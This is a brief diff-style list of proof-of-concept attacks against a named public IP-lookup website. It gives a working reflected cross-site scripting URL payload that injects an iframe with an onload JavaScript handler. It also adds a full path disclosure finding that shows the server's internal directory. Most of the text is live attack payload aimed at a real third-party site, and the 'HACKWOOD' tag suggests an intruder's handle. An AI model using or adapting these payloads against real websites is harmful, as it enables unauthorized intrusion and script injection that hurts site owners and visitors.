@@ -1,2 +1,6 @@
 [1] XSS WEB ATTACK
 [1] POC: https://geoiplookup.net/ip-addresses/1.1.1.1-1.1.1.1%7C%3Ciframe%20src=%22%22%20onload=%22alert(document.querySelector('input[name=ip]').value);%22%3EHACKWOOD
+
+[2] FULL PATH DISCLOSURE
+[2] POC: https://geoiplookup.net/ip-addresses/
+[2] RESULT: /var/www/geoiplookup/public/
